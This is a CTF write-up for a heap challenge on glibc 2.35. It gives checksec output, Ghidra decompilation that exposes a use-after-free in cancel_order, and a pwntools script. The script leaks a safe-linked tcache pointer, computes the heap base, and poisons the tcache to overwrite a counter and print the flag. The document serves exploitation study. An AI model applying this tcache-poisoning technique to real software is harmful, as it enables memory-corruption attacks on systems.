## Tags: `UAF`, `tcachebin dup`

### Challennge info


```c
└─$ ls                            
chall  libc.so.6  
```
```c
└─$ strings libc.so.6 | grep "GNU C Library"
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.13) stable release version 2.35.
```

File info:
```c
└─$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=909bc92697afc4059537d85880a67e9039743f0f, for GNU/Linux 3.2.0, not stripped
```

```c
┌──(kali㉿kali)-[~/CTFs/AproorvCTF/pwn/house_of_wade]
└─$ checksec --file=chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols   FORTIFY  Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   59 Symbols  No     0               3               chall
```

___
Code from Ghidra:
```c
undefined8 main(void)

{
  int option;
  long in_FS_OFFSET;
  char input [4];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  chimichanga_count = malloc(0x28);
  memset(chimichanga_count,0,0x28);
  puts("\nWelcome to Wade\'s Chimichanga Shop.");
  puts("\"There\'s a very special counter somewhere in here.\"");
  puts("\"No I won\'t tell you where. Figure it out.\"\n");
  do {
    menu();
    read_n(input,3);
    option = atoi(input);
    switch(option) {
    default:
      puts("\"Not on the menu.\"");
      break;
    case 1:
      new_order();
      break;
    case 2:
      cancel_order();
      break;
    case 3:
      inspect_order();
      break;
    case 4:
      modify_order();
      break;
    case 5:
      did_i_pass();
      break;
    case 6:
      puts("\"Disappointing.\"");
      if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return 0;
    }
  } while( true );
}
```
```c
void new_order(void)

{
  char *chunk;
  uint idx;
  
  idx = 0;
  while( true ) {
    if (5 < (int)idx) {
      puts("\"Kitchen\'s full.\"");
      return;
    }
    if ((&orders)[(int)idx] == (char *)0x0) break;
    idx = idx + 1;
  }
  chunk = (char *)malloc(0x28);
  (&orders)[(int)idx] = chunk;
  memset((&orders)[(int)idx],0,0x28);
  printf("\"Order %d is up. Fresh off the heap. That\'s all you get.\"\n",(ulong)idx);
  return;
}
```
```c
void cancel_order(void)

{
  int idx;
  
  idx = get_idx();
  if (-1 < idx) {
    if ((&orders)[idx] == (char *)0x0) {
      puts("\"Nothing there.\"");
    }
    else {
      free((&orders)[idx]);
      puts("\"Gone. The pointer remains, like a bad memory.\"");
    }
  }
  return;
}
```
```c
void inspect_order(void)

{
  int idx;
  
  idx = get_idx();
  if (-1 < idx) {
    if ((&orders)[idx] == (char *)0x0) {
      puts("\"Nothing there.\"");
    }
    else {
      puts("\"Wade sniffs the chimichanga. Something\'s... off.\"");
      write(1,(&orders)[idx],0x28);
      puts("");
    }
  }
  return;
}
```
```c
void modify_order(void)

{
  int idx;
  
  idx = get_idx();
  if (-1 < idx) {
    if ((&orders)[idx] == (char *)0x0) {
      puts("\"Nothing there.\"");
    }
    else {
      printf("\"New filling: \"");
      read_n((&orders)[idx],0x28);
      puts("\"Undetectable. Probably.\"");
    }
  }
  return;
}
```

```c
void did_i_pass(void)

{
  int __fd;
  size_t __n;
  long in_FS_OFFSET;
  undefined1 local_98 [136];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  if ((chimichanga_count == (int *)0x0) || (*chimichanga_count != L'\xcafebabe')) {
    puts("\"Wrong number, Francis. Walk it off.\"");
  }
  else {
    puts("\nWade slow-claps from across the room.");
    puts("\"...Okay. I\'ll admit it. That was impressive.\"\n");
    __fd = open("/flag.txt",0);
    if (__fd < 0) {
      puts("Couldn\'t open the secret recipe.");
    }
    else {
      while( true ) {
        __n = read(__fd,local_98,0x80);
        if ((long)__n < 1) break;
        write(1,local_98,__n);
      }
      write(1,&DAT_00402091,1);
      close(__fd);
    }
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

___
### Exploit:

<img width="807" height="825" alt="image" src="https://github.com/user-attachments/assets/8f878156-20c5-47c4-9a0e-bf99f97a9ca4" />


___
`script.py`

```python

from pwn import *

libc = ELF("./libc.so.6", checksec=False)

context.binary = exe = ELF("./chall", checksec=False)
context.log_level = "debug"

def GDB():
	gdb.attach(p, gdbscript='''
		br *new_order + 58
		br *new_order + 152

		br *cancel_order + 104
		
		br *did_i_pass
		br *did_i_pass + 55

		x/4gx &orders
		''')

def new_order():
	p.sendlineafter(b">", b"1")

def cancel_order(idx):
	p.sendlineafter(b">", b"2")
	p.sendlineafter(b"Slot:", idx)

def inspect_order(idx):
	p.sendlineafter(b">", b"3")
	p.sendlineafter(b"Slot:", idx)

def modify_order(idx, data):
	p.sendlineafter(b">", b"4")
	p.sendlineafter(b"Slot:", idx)
	p.sendlineafter(b"filling: \"", data)

def did_i_pass():
	p.sendlineafter(b">", b"5")

p = process(exe.path)
GDB()

chimichanga_count = p64(0x4040c0)

new_order()
new_order()

cancel_order(b'0')

inspect_order(b'0')

p.recvuntil(b"\n")
leak_fd = u64(p.recv(6).ljust(8, b"\x00"))
print(f"leak_fd: {hex(leak_fd)}")

heap_base = leak_fd << 12 
print(f"heap_base: {hex(heap_base)}")

chimichanga_count = heap_base + 0x2a0
print(f"chimichanga_count: {hex(chimichanga_count)}")
order1_addr = heap_base + 0x300
print(f"order1_addr: {hex(order1_addr)}")

cancel_order(b'1')

fake_fd = (order1_addr >> 12) ^ chimichanga_count 
print(f"fake_fd: {hex(fake_fd)}")

modify_order(b'1', p64(fake_fd) + p64(0))

new_order()
new_order()

modify_order(b'3', p64(0xcafebabe))

p.interactive()
```
